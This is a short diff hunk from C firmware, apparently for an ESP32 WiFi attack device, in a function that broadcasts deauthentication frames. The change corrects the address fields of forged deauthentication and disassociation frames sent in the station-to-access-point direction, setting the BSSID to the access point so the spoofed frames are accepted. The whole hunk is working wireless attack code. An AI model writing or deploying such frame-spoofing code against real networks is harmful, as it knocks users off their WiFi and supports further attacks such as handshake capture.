@@ -2098,13 +2098,13 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     // If not broadcast, send reverse direction
     if (!is_broadcast) {
         // Swap addresses for Station -> AP direction
-        memcpy(&deauth_frame[4], bssid, 6); // Set destination as AP
-        memcpy(&deauth_frame[10], mac, 6);  // Set source as station
-        memcpy(&deauth_frame[16], mac, 6);  // Set BSSID as station
+        memcpy(&deauth_frame[4], bssid, 6);
+        memcpy(&deauth_frame[10], mac, 6);
+        memcpy(&deauth_frame[16], bssid, 6);
 
         memcpy(&disassoc_frame[4], bssid, 6);
         memcpy(&disassoc_frame[10], mac, 6);
-        memcpy(&disassoc_frame[16], mac, 6);
+        memcpy(&disassoc_frame[16], bssid, 6);
 
         // New sequence number for reverse direction
         seq = (esp_random() & 0xFFF) << 4;
